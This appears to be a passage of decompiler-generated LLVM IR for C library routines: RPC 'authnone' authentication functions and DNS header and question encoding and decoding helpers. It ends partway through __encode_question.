define i32 @authnone_validate() local_unnamed_addr {
entry:
  ret i32 1
}

define i32 @authnone_refresh() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @authnone_destroy() local_unnamed_addr {
entry:
  %v1_33400 = load i32, i32* @r0, align 4
  ret i32 %v1_33400
}

define i32 @authnone_marshal(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_3340c = call i32 @__rpc_thread_variables()
  store i32 %v0_3340c, i32* %r0.global-to-local, align 4
  %v1_33410 = add i32 %v0_3340c, 152
  %v2_33410 = inttoptr i32 %v1_33410 to i32*
  %v3_33410 = load i32, i32* %v2_33410, align 4
  %v2_33414 = icmp eq i32 %v3_33410, 0
  br i1 %v2_33414, label %bb, label %bb12

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread8

bb12:                                             ; preds = %entry
  %v1_33420 = load i32, i32* @r4, align 4
  store i32 %v1_33420, i32* %r0.global-to-local, align 4
  %v2_33424 = add i32 %v1_33420, 4
  %v3_33424 = inttoptr i32 %v2_33424 to i32*
  %v4_33424 = load i32, i32* %v3_33424, align 4
  %v2_3342c = add i32 %v4_33424, 12
  %v3_3342c = inttoptr i32 %v2_3342c to i32*
  %v4_3342c = load i32, i32* %v3_3342c, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb, %bb12
  %.09 = phi i32 [ %v4_3342c, %bb12 ], [ undef, %bb ]
  %v2_33434 = xor i1 %v2_33414, true
  call void @__pseudo_cond_branch(i1 %v2_33434, i32 %.09)
  %v1_3343c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_3343c

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 undef, { 0, 5, 1, 2, 3, 4, 6, 7 }
  uselistorder label %.thread8, { 1, 0 }
}

define i32 @authnone_create() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %v9_33440 = load i32, i32* @r6, align 4
  %v2_33444 = ptrtoint i32* %stack_var_-40 to i32
  %v0_33448 = call i32 @__rpc_thread_variables()
  store i32 %v0_33448, i32* %r0.global-to-local, align 4
  %v1_3344c = add i32 %v0_33448, 152
  %v2_3344c = inttoptr i32 %v1_3344c to i32*
  %v3_3344c = load i32, i32* %v2_3344c, align 4
  store i32 %v3_3344c, i32* @r5, align 4
  %v2_33454 = icmp eq i32 %v3_3344c, 0
  store i32 %v0_33448, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r6, align 4
  br i1 %v2_33454, label %dec_label_pc_33464, label %dec_label_pc_33480

dec_label_pc_33464:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r1.global-to-local, align 4
  %v2_3346c = call i32 @calloc(i32 1, i32 64)
  store i32 %v2_3346c, i32* %r0.global-to-local, align 4
  %v2_33470 = icmp eq i32 %v2_3346c, 0
  br i1 %v2_33470, label %dec_label_pc_33510, label %dec_label_pc_33478

dec_label_pc_33478:                               ; preds = %dec_label_pc_33464
  %v1_33478 = load i32, i32* @r4, align 4
  %v2_33478 = add i32 %v1_33478, 152
  %v3_33478 = inttoptr i32 %v2_33478 to i32*
  store i32 %v2_3346c, i32* %v3_33478, align 4
  store i32 %v2_3346c, i32* @r5, align 4
  br label %dec_label_pc_33480

dec_label_pc_33480:                               ; preds = %entry, %dec_label_pc_33478
  %v0_3349c = phi i32 [ %v3_3344c, %entry ], [ %v2_3346c, %dec_label_pc_33478 ]
  %v1_33480 = add i32 %v0_3349c, 60
  %v2_33480 = inttoptr i32 %v1_33480 to i32*
  %v3_33480 = load i32, i32* %v2_33480, align 4
  store i32 %v3_33480, i32* %ip.global-to-local, align 4
  %v2_33484 = icmp eq i32 %v3_33480, 0
  br i1 %v2_33484, label %dec_label_pc_3348c, label %dec_label_pc_33510

dec_label_pc_3348c:                               ; preds = %dec_label_pc_33480
  store i32 240, i32* %r3.global-to-local, align 4
  %v0_33490 = load i32, i32* @r6, align 4
  %v2_33490 = add i32 %v0_33490, 240
  %v3_33490 = inttoptr i32 %v2_33490 to i32*
  %v4_33490 = load i32, i32* %v3_33490, align 4
  store i32 %v4_33490, i32* %r3.global-to-local, align 4
  %v1_33494 = inttoptr i32 %v4_33490 to i32*
  %v2_33494 = load i32, i32* %v1_33494, align 4
  store i32 %v2_33494, i32* %r0.global-to-local, align 4
  %v3_33494 = add i32 %v4_33490, 4
  %v4_33494 = inttoptr i32 %v3_33494 to i32*
  %v5_33494 = load i32, i32* %v4_33494, align 4
  store i32 %v5_33494, i32* %r1.global-to-local, align 4
  %v6_33494 = add i32 %v4_33490, 8
  %v7_33494 = inttoptr i32 %v6_33494 to i32*
  %v8_33494 = load i32, i32* %v7_33494, align 4
  store i32 %v8_33494, i32* %r2.global-to-local, align 4
  %v1_3349c = add i32 %v0_3349c, 12
  store i32 %v1_3349c, i32* @r4, align 4
  %v2_334a0 = add i32 %v0_33490, -56
  store i32 %v2_334a0, i32* %r3.global-to-local, align 4
  %v1_334a4 = inttoptr i32 %v1_3349c to i32*
  store i32 %v2_33494, i32* %v1_334a4, align 4
  %v3_334a4 = add i32 %v0_3349c, 16
  %v4_334a4 = inttoptr i32 %v3_334a4 to i32*
  %v5_334a4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_334a4, i32* %v4_334a4, align 4
  %v6_334a4 = add i32 %v0_3349c, 20
  %v7_334a4 = inttoptr i32 %v6_334a4 to i32*
  %v8_334a4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_334a4, i32* %v7_334a4, align 4
  %v0_334a8 = load i32, i32* @r5, align 4
  %v1_334a8 = inttoptr i32 %v0_334a8 to i32*
  %v2_334a8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_334a8, i32* %v1_334a8, align 4
  %v3_334a8 = add i32 %v0_334a8, 4
  %v4_334a8 = inttoptr i32 %v3_334a8 to i32*
  %v5_334a8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_334a8, i32* %v4_334a8, align 4
  %v6_334a8 = add i32 %v0_334a8, 8
  %v7_334a8 = inttoptr i32 %v6_334a8 to i32*
  %v8_334a8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_334a8, i32* %v7_334a8, align 4
  %v0_334ac = load i32, i32* %r3.global-to-local, align 4
  %v1_334ac = load i32, i32* @r5, align 4
  %v2_334ac = add i32 %v1_334ac, 32
  %v3_334ac = inttoptr i32 %v2_334ac to i32*
  store i32 %v0_334ac, i32* %v3_334ac, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  %v0_334b4 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_334b4, i32* %r3.global-to-local, align 4
  store i32 %v2_33444, i32* %r0.global-to-local, align 4
  %v0_334bc = load i32, i32* @r5, align 4
  %v1_334bc = add i32 %v0_334bc, 40
  store i32 %v1_334bc, i32* %r1.global-to-local, align 4
  %v10_334c0 = call i32 @__GI_xdrmem_create(i32* nonnull %stack_var_-40, i32 %v1_334bc, i32 20, i32 %v0_334b4, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_334c4 = load i32, i32* @r5, align 4
  store i32 %v0_334c4, i32* @r1, align 4
  store i32 %v2_33444, i32* @r0, align 4
  %v0_334cc = call i32 @xdr_opaque_auth()
  %v0_334d0 = load i32, i32* @r4, align 4
  store i32 %v0_334d0, i32* @r1, align 4
  store i32 %v2_33444, i32* @r0, align 4
  %v0_334d8 = call i32 @xdr_opaque_auth()
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %v2_33444, i32* %r0.global-to-local, align 4
  %v1_334e4 = add i32 %tmp, 16
  %v2_334e4 = inttoptr i32 %v1_334e4 to i32*
  %v3_334e4 = load i32, i32* %v2_334e4, align 4
  store i32 %v3_334e4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v3_334e4)
  %v1_334f0 = load i32, i32* @r5, align 4
  %v2_334f0 = add i32 %v1_334f0, 60
  %v3_334f0 = inttoptr i32 %v2_334f0 to i32*
  store i32 %v2_33444, i32* %v3_334f0, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v1_334f8 = add i32 %tmp, 28
  %v2_334f8 = inttoptr i32 %v1_334f8 to i32*
  %v3_334f8 = load i32, i32* %v2_334f8, align 4
  store i32 %v3_334f8, i32* %r3.global-to-local, align 4
  %v2_334fc = icmp eq i32 %v3_334f8, 0
  br i1 %v2_334fc, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_3348c
  store i32 %v2_33444, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_3348c, %bb
  %v2_3350c = xor i1 %v2_334fc, true
  call void @__pseudo_cond_branch(i1 %v2_3350c, i32 %v3_334f8)
  br label %dec_label_pc_33510

dec_label_pc_33510:                               ; preds = %dec_label_pc_33480, %dec_label_pc_33464, %.thread
  %v0_33510 = load i32, i32* @r5, align 4
  store i32 %v0_33510, i32* %r0.global-to-local, align 4
  store i32 %v9_33440, i32* @r6, align 4
  ret i32 %v0_33510

; uselistorder directives
  uselistorder i32 %v4_33490, { 2, 1, 0, 3 }
  uselistorder i32 %v0_3349c, { 2, 1, 0, 3 }
  uselistorder i32 %tmp, { 3, 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8 }
  uselistorder i32 240, { 2, 3, 1, 4, 0 }
  uselistorder i32 60, { 20, 21, 10, 11, 12, 13, 22, 5, 6, 7, 0, 16, 17, 8, 18, 14, 15, 19, 23, 1, 3, 2, 4, 9 }
  uselistorder i32 (i32, i32)* @calloc, { 1, 5, 2, 4, 0, 3 }
  uselistorder i32 64, { 4, 40, 34, 41, 35, 11, 12, 13, 14, 2, 36, 0, 37, 38, 42, 15, 39, 16, 48, 43, 44, 46, 45, 17, 18, 19, 20, 21, 22, 23, 3, 47, 25, 24, 10, 5, 6, 26, 7, 27, 28, 29, 30, 31, 32, 33, 8, 1, 9 }
  uselistorder i32 152, { 3, 4, 2, 6, 5, 0, 1 }
  uselistorder i32 ()* @__rpc_thread_variables, { 5, 18, 12, 17, 16, 3, 15, 14, 13, 11, 4, 0, 2, 10, 1, 9, 6, 8, 7 }
  uselistorder label %dec_label_pc_33510, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_33480, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_33530 = load i32, i32* @lr, align 4
  store i32 %v0_33530, i32* %stack_var_-4, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v7_3353c = icmp sgt i32 %arg3, 11
  br i1 %v7_3353c, label %dec_label_pc_33544, label %dec_label_pc_33610

dec_label_pc_33544:                               ; preds = %entry
  %tmp16 = inttoptr i32 %arg2 to i8*
  %v1_33544 = add i32 %tmp, 1
  %v2_33544 = inttoptr i32 %v1_33544 to i8*
  %v3_33544 = load i8, i8* %v2_33544, align 1
  store i8 %v3_33544, i8* %tmp16, align 1
  %v0_3354c = load i32, i32* %ip.global-to-local, align 4
  %v1_3354c = inttoptr i32 %v0_3354c to i32*
  %v2_3354c = load i32, i32* %v1_3354c, align 4
  %v1_33550 = trunc i32 %v2_3354c to i8
  %v4_33550 = add i32 %arg2, 1
  %v5_33550 = inttoptr i32 %v4_33550 to i8*
  store i8 %v1_33550, i8* %v5_33550, align 1
  %v0_33554 = load i32, i32* %ip.global-to-local, align 4
  %v1_33554 = add i32 %v0_33554, 8
  %v2_33554 = inttoptr i32 %v1_33554 to i32*
  %v3_33554 = load i32, i32* %v2_33554, align 4
  %v1_33558 = add i32 %v0_33554, 20
  %v2_33558 = inttoptr i32 %v1_33558 to i32*
  %v3_33558 = load i32, i32* %v2_33558, align 4
  %v1_3355c = add i32 %v0_33554, 4
  %v2_3355c = inttoptr i32 %v1_3355c to i32*
  %v3_3355c = load i32, i32* %v2_3355c, align 4
  %v1_33560 = add i32 %v0_33554, 12
  %v2_33560 = inttoptr i32 %v1_33560 to i32*
  %v3_33560 = load i32, i32* %v2_33560, align 4
  %v2_33564 = icmp eq i32 %v3_33558, 0
  br i1 %v2_33564, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_33544
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_33544, %bb
  %v0_33574 = phi i32 [ 0, %dec_label_pc_33544 ], [ 1, %bb ]
  %v1_3356c = urem i32 %v3_33554, 16
  %v2_33570 = icmp eq i32 %v3_3355c, 0
  %v4_33574 = mul nuw nsw i32 %v1_3356c, 8
  %v5_33574 = or i32 %v0_33574, %v4_33574
  %v1_33578 = add i32 %v0_33554, 16
  %v2_33578 = inttoptr i32 %v1_33578 to i32*
  %v3_33578 = load i32, i32* %v2_33578, align 4
  %. = select i1 %v2_33570, i32 0, i32 128
  %v2_33584 = icmp eq i32 %v3_33560, 0
  %storemerge11 = select i1 %v2_33584, i32 0, i32 4
  %v2_33590 = or i32 %v5_33574, %.
  %v2_33594 = icmp eq i32 %v3_33578, 0
  %.26 = select i1 %v2_33594, i32 0, i32 2
  %v2_335a0 = or i32 %v2_33590, %storemerge11
  %v2_335a4 = or i32 %v2_335a0, %.26
  %v1_335a8 = trunc i32 %v2_335a4 to i8
  %v2_335a8 = load i32, i32* %lr.global-to-local, align 4
  %v3_335a8 = add i32 %v2_335a8, 2
  %v4_335a8 = inttoptr i32 %v3_335a8 to i8*
  store i8 %v1_335a8, i8* %v4_335a8, align 1
  %v0_335ac = load i32, i32* %ip.global-to-local, align 4
  %v1_335ac = add i32 %v0_335ac, 24
  %v1_335b0 = inttoptr i32 %v1_335ac to i32*
  %v2_335b0 = load i32, i32* %v1_335b0, align 4
  %v3_335b0 = add i32 %v0_335ac, 28
  %v4_335b0 = inttoptr i32 %v3_335b0 to i32*
  %v5_335b0 = load i32, i32* %v4_335b0, align 4
  %v2_335b4 = icmp eq i32 %v2_335b0, 0
  %v1_335b8 = urem i32 %v5_335b0, 16
  %v0_335c4 = select i1 %v2_335b4, i32 0, i32 128
  %v2_335c4 = or i32 %v1_335b8, %v0_335c4
  %v1_335c8 = trunc i32 %v2_335c4 to i8
  %v2_335c8 = load i32, i32* %lr.global-to-local, align 4
  %v3_335c8 = add i32 %v2_335c8, 3
  %v4_335c8 = inttoptr i32 %v3_335c8 to i8*
  store i8 %v1_335c8, i8* %v4_335c8, align 1
  %v0_335cc = load i32, i32* %ip.global-to-local, align 4
  %v1_335cc = add i32 %v0_335cc, 33
  %v2_335cc = inttoptr i32 %v1_335cc to i8*
  %v3_335cc = load i8, i8* %v2_335cc, align 1
  %v2_335d0 = load i32, i32* %lr.global-to-local, align 4
  %v3_335d0 = add i32 %v2_335d0, 4
  %v4_335d0 = inttoptr i32 %v3_335d0 to i8*
  store i8 %v3_335cc, i8* %v4_335d0, align 1
  %v0_335d4 = load i32, i32* %ip.global-to-local, align 4
  %v1_335d4 = add i32 %v0_335d4, 32
  %v2_335d4 = inttoptr i32 %v1_335d4 to i32*
  %v3_335d4 = load i32, i32* %v2_335d4, align 4
  %v1_335d8 = trunc i32 %v3_335d4 to i8
  %v2_335d8 = load i32, i32* %lr.global-to-local, align 4
  %v3_335d8 = add i32 %v2_335d8, 5
  %v4_335d8 = inttoptr i32 %v3_335d8 to i8*
  store i8 %v1_335d8, i8* %v4_335d8, align 1
  %v0_335dc = load i32, i32* %ip.global-to-local, align 4
  %v1_335dc = add i32 %v0_335dc, 37
  %v2_335dc = inttoptr i32 %v1_335dc to i8*
  %v3_335dc = load i8, i8* %v2_335dc, align 1
  %v2_335e0 = load i32, i32* %lr.global-to-local, align 4
  %v3_335e0 = add i32 %v2_335e0, 6
  %v4_335e0 = inttoptr i32 %v3_335e0 to i8*
  store i8 %v3_335dc, i8* %v4_335e0, align 1
  %v0_335e4 = load i32, i32* %ip.global-to-local, align 4
  %v1_335e4 = add i32 %v0_335e4, 36
  %v2_335e4 = inttoptr i32 %v1_335e4 to i32*
  %v3_335e4 = load i32, i32* %v2_335e4, align 4
  %v1_335e8 = trunc i32 %v3_335e4 to i8
  %v2_335e8 = load i32, i32* %lr.global-to-local, align 4
  %v3_335e8 = add i32 %v2_335e8, 7
  %v4_335e8 = inttoptr i32 %v3_335e8 to i8*
  store i8 %v1_335e8, i8* %v4_335e8, align 1
  %v0_335ec = load i32, i32* %ip.global-to-local, align 4
  %v1_335ec = add i32 %v0_335ec, 41
  %v2_335ec = inttoptr i32 %v1_335ec to i8*
  %v3_335ec = load i8, i8* %v2_335ec, align 1
  %v2_335f0 = load i32, i32* %lr.global-to-local, align 4
  %v3_335f0 = add i32 %v2_335f0, 8
  %v4_335f0 = inttoptr i32 %v3_335f0 to i8*
  store i8 %v3_335ec, i8* %v4_335f0, align 1
  %v0_335f4 = load i32, i32* %ip.global-to-local, align 4
  %v1_335f4 = add i32 %v0_335f4, 40
  %v2_335f4 = inttoptr i32 %v1_335f4 to i32*
  %v3_335f4 = load i32, i32* %v2_335f4, align 4
  %v1_335f8 = trunc i32 %v3_335f4 to i8
  %v2_335f8 = load i32, i32* %lr.global-to-local, align 4
  %v3_335f8 = add i32 %v2_335f8, 9
  %v4_335f8 = inttoptr i32 %v3_335f8 to i8*
  store i8 %v1_335f8, i8* %v4_335f8, align 1
  %v0_335fc = load i32, i32* %ip.global-to-local, align 4
  %v1_335fc = add i32 %v0_335fc, 45
  %v2_335fc = inttoptr i32 %v1_335fc to i8*
  %v3_335fc = load i8, i8* %v2_335fc, align 1
  %v2_33600 = load i32, i32* %lr.global-to-local, align 4
  %v3_33600 = add i32 %v2_33600, 10
  %v4_33600 = inttoptr i32 %v3_33600 to i8*
  store i8 %v3_335fc, i8* %v4_33600, align 1
  %v0_33604 = load i32, i32* %ip.global-to-local, align 4
  %v1_33604 = add i32 %v0_33604, 44
  %v2_33604 = inttoptr i32 %v1_33604 to i32*
  %v3_33604 = load i32, i32* %v2_33604, align 4
  %v1_33608 = trunc i32 %v3_33604 to i8
  %v2_33608 = load i32, i32* %lr.global-to-local, align 4
  %v3_33608 = add i32 %v2_33608, 11
  %v4_33608 = inttoptr i32 %v3_33608 to i8*
  store i8 %v1_33608, i8* %v4_33608, align 1
  %v2_33610.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_33610

dec_label_pc_33610:                               ; preds = %entry, %bb17
  %v2_33610 = phi i32 [ %v2_33610.pre, %bb17 ], [ %v0_33530, %entry ]
  %storemerge = phi i32 [ 12, %bb17 ], [ -1, %entry ]
  store i32 %v2_33610, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_33554, { 0, 2, 1, 3, 4 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 45, { 5, 6, 1, 7, 3, 8, 4, 2, 0 }
  uselistorder i32 41, { 2, 0, 1 }
  uselistorder i32 37, { 3, 1, 2, 4, 5, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_33610, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_33618 = load i8, i8* %arg1, align 1
  %v4_33618 = zext i8 %v3_33618 to i32
  %v2_3361c = add i32 %tmp, 1
  %v3_3361c = inttoptr i32 %v2_3361c to i8*
  %v4_3361c = load i8, i8* %v3_3361c, align 1
  %v5_3361c = zext i8 %v4_3361c to i32
  %v4_33620 = mul nuw nsw i32 %v4_33618, 256
  %v5_33620 = or i32 %v5_3361c, %v4_33620
  %v2_33624 = inttoptr i32 %arg2 to i32*
  store i32 %v5_33620, i32* %v2_33624, align 4
  %v2_33628 = add i32 %tmp, 2
  %v3_33628 = inttoptr i32 %v2_33628 to i8*
  %v4_33628 = load i8, i8* %v3_33628, align 1
  %tmp3 = icmp slt i8 %v4_33628, 0
  %v3_3362c = zext i1 %tmp3 to i32
  %v2_33630 = add i32 %arg2, 4
  %v3_33630 = inttoptr i32 %v2_33630 to i32*
  store i32 %v3_3362c, i32* %v3_33630, align 4
  %v4_33634 = load i8, i8* %v3_33628, align 1
  %div = udiv i8 %v4_33634, 8
  %tmp4 = urem i8 %div, 16
  %v1_3363c = zext i8 %tmp4 to i32
  %v2_33640 = add i32 %arg2, 8
  %v3_33640 = inttoptr i32 %v2_33640 to i32*
  store i32 %v1_3363c, i32* %v3_33640, align 4
  %v4_33644 = load i8, i8* %v3_33628, align 1
  %div1 = udiv i8 %v4_33644, 4
  %tmp5 = urem i8 %div1, 2
  %v1_3364c = zext i8 %tmp5 to i32
  %v2_33650 = add i32 %arg2, 12
  %v3_33650 = inttoptr i32 %v2_33650 to i32*
  store i32 %v1_3364c, i32* %v3_33650, align 4
  %v4_33654 = load i8, i8* %v3_33628, align 1
  %div2 = udiv i8 %v4_33654, 2
  %tmp6 = urem i8 %div2, 2
  %v1_3365c = zext i8 %tmp6 to i32
  %v2_33660 = add i32 %arg2, 16
  %v3_33660 = inttoptr i32 %v2_33660 to i32*
  store i32 %v1_3365c, i32* %v3_33660, align 4
  %v4_33664 = load i8, i8* %v3_33628, align 1
  %tmp7 = urem i8 %v4_33664, 2
  %v1_33668 = zext i8 %tmp7 to i32
  %v2_3366c = add i32 %arg2, 20
  %v3_3366c = inttoptr i32 %v2_3366c to i32*
  store i32 %v1_33668, i32* %v3_3366c, align 4
  %v2_33670 = add i32 %tmp, 3
  %v3_33670 = inttoptr i32 %v2_33670 to i8*
  %v4_33670 = load i8, i8* %v3_33670, align 1
  %tmp8 = icmp slt i8 %v4_33670, 0
  %v3_33674 = zext i1 %tmp8 to i32
  %v2_33678 = add i32 %arg2, 24
  %v3_33678 = inttoptr i32 %v2_33678 to i32*
  store i32 %v3_33674, i32* %v3_33678, align 4
  %v4_3367c = load i8, i8* %v3_33670, align 1
  %tmp9 = urem i8 %v4_3367c, 16
  %v1_33680 = zext i8 %tmp9 to i32
  %v2_33684 = add i32 %arg2, 28
  %v3_33684 = inttoptr i32 %v2_33684 to i32*
  store i32 %v1_33680, i32* %v3_33684, align 4
  %v2_33688 = add i32 %tmp, 4
  %v3_33688 = inttoptr i32 %v2_33688 to i8*
  %v4_33688 = load i8, i8* %v3_33688, align 1
  %v5_33688 = zext i8 %v4_33688 to i32
  %v2_3368c = add i32 %tmp, 5
  %v3_3368c = inttoptr i32 %v2_3368c to i8*
  %v4_3368c = load i8, i8* %v3_3368c, align 1
  %v5_3368c = zext i8 %v4_3368c to i32
  %v4_33690 = mul nuw nsw i32 %v5_33688, 256
  %v5_33690 = or i32 %v5_3368c, %v4_33690
  %v2_33694 = add i32 %arg2, 32
  %v3_33694 = inttoptr i32 %v2_33694 to i32*
  store i32 %v5_33690, i32* %v3_33694, align 4
  %v2_33698 = add i32 %tmp, 6
  %v3_33698 = inttoptr i32 %v2_33698 to i8*
  %v4_33698 = load i8, i8* %v3_33698, align 1
  %v5_33698 = zext i8 %v4_33698 to i32
  %v2_3369c = add i32 %tmp, 7
  %v3_3369c = inttoptr i32 %v2_3369c to i8*
  %v4_3369c = load i8, i8* %v3_3369c, align 1
  %v5_3369c = zext i8 %v4_3369c to i32
  %v4_336a0 = mul nuw nsw i32 %v5_33698, 256
  %v5_336a0 = or i32 %v5_3369c, %v4_336a0
  %v2_336a4 = add i32 %arg2, 36
  %v3_336a4 = inttoptr i32 %v2_336a4 to i32*
  store i32 %v5_336a0, i32* %v3_336a4, align 4
  %v2_336a8 = add i32 %tmp, 8
  %v3_336a8 = inttoptr i32 %v2_336a8 to i8*
  %v4_336a8 = load i8, i8* %v3_336a8, align 1
  %v5_336a8 = zext i8 %v4_336a8 to i32
  %v2_336ac = add i32 %tmp, 9
  %v3_336ac = inttoptr i32 %v2_336ac to i8*
  %v4_336ac = load i8, i8* %v3_336ac, align 1
  %v5_336ac = zext i8 %v4_336ac to i32
  %v4_336b0 = mul nuw nsw i32 %v5_336a8, 256
  %v5_336b0 = or i32 %v5_336ac, %v4_336b0
  %v2_336b4 = add i32 %arg2, 40
  %v3_336b4 = inttoptr i32 %v2_336b4 to i32*
  store i32 %v5_336b0, i32* %v3_336b4, align 4
  %v2_336b8 = add i32 %tmp, 11
  %v3_336b8 = inttoptr i32 %v2_336b8 to i8*
  %v4_336b8 = load i8, i8* %v3_336b8, align 1
  %v5_336b8 = zext i8 %v4_336b8 to i32
  %v2_336bc = add i32 %tmp, 10
  %v3_336bc = inttoptr i32 %v2_336bc to i8*
  %v4_336bc = load i8, i8* %v3_336bc, align 1
  %v5_336bc = zext i8 %v4_336bc to i32
  %v4_336c0 = mul nuw nsw i32 %v5_336bc, 256
  %v5_336c0 = or i32 %v4_336c0, %v5_336b8
  %v2_336c4 = add i32 %arg2, 44
  %v3_336c4 = inttoptr i32 %v2_336c4 to i32*
  store i32 %v5_336c0, i32* %v3_336c4, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i8 2, { 3, 4, 5, 6, 8, 7, 9, 12, 13, 14, 10, 15, 11, 1, 0, 2 }
  uselistorder i8 4, { 3, 0, 1, 2 }
  uselistorder i8 16, { 3, 4, 5, 6, 7, 0, 8, 1, 9, 2 }
  uselistorder i8 8, { 3, 1, 0, 2 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_336cc = load i32, i32* @r4, align 4
  store i32 %v3_336cc, i32* %stack_var_-16, align 4
  %v9_336cc = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_336d4 = load i32, i32* %arg1, align 4
  store i32 %v2_336d4, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  %v1_336e0 = inttoptr i32 %v2_336d4 to i8*
  %v2_336e0 = call i32 @__encode_dotted(i8* %v1_336e0)
  store i32 %v2_336e0, i32* %r0.global-to-local, align 4
  %v1_336e4 = icmp slt i32 %v2_336e0, 0
  br i1 %v1_336e4, label %dec_label_pc_33724, label %dec_label_pc_336ec

dec_label_pc_336ec:                               ; preds = %entry
  %v1_336ec = load i32, i32* @r5, align 4
  %v2_336ec = sub i32 %v1_336ec, %v2_336e0
  %v7_336f4 = icmp slt i32 %v2_336ec, 4
  br i1 %v7_336f4, label %bb, label %dec_label_pc_336fc

bb:                                               ; preds = %dec_label_pc_336ec
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_33724

dec_label_pc_336fc:                               ; preds = %dec_label_pc_336ec
  %v0_336fc = load i32, i32* @r4, align 4
  %v1_336fc = add i32 %v0_336fc, 5
  %v2_336fc = inttoptr i32 %v1_336fc to i8*
  %v3_336fc = load i8, i8* %v2_336fc, align 1
  %v2_33700 = load i32, i32* @r6, align 4
  %v4_33700 = add i32 %v2_33700, %v2_336e0
  %v5_33700 = inttoptr i32 %v4_33700 to i8*
  store i8 %v3_336fc, i8* %v5_33700, align 1
  %v0_33704 = load i32, i32* @r4, align 4
  %v1_33704 = add i32 %v0_33704, 4
  %v2_33704 = inttoptr i32 %v1_33704 to i32*
  %v3_33704 = load i32, i32* %v2_33704, align 4
  %v0_33708 = load i32, i32* @r6, align 4
  %v1_33708 = load i32, i32* %r0.global-to-local, align 4
  %v2_33708 = add i32 %v1_33708, %v0_33708
  store i32 %v2_33708, i32* %r2.global-to-local, align 4
  %v1_3370c = trunc i32 %v3_33704 to i8
  %v3_3370c = add i32 %v2_33708, 1
  %v4_3370c = inttoptr i32 %v3_3370c to i8*
  store i8 %v1_3370c, i8* %v4_3370c, align 1
  %v0_33710 = load i32, i32* @r4, align 4
  %v1_33710 = add i32 %v0_33710, 9
  %v2_33710 = inttoptr i32 %v1_33710 to i8*
  %v3_33710 = load i8, i8* %v2_33710, align 1
  %v2_33714 = load i32, i32* %r2.global-to-local, align 4
  %v3_33714 = add i32 %v2_33714, 2
  %v4_33714 = inttoptr i32 %v3_33714 to i8*
  store i8 %v3_33710, i8* %v4_33714, align 1
  %v0_33718 = load i32, i32* @r4, align 4
  %v1_33718 = add i32 %v0_33718, 8
  %v2_33718 = inttoptr i32 %v1_33718 to i32*
  %v3_33718 = load i32, i32* %v2_33718, align 4
  %v1_3371c = trunc i32 %v3_33718 to i8
  %v2_3371c = load i32, i32* %r2.global-to-local, align 4
  %v3_3371c = add i32 %v2_3371c, 3
  %v4_3371c = inttoptr i32 %v3_3371c to i8*
  store i8 %v1_3371c, i8* %v4_3371c, align 1
  %v0_33720 = load i32, i32* %r0.global-to-local, align 4
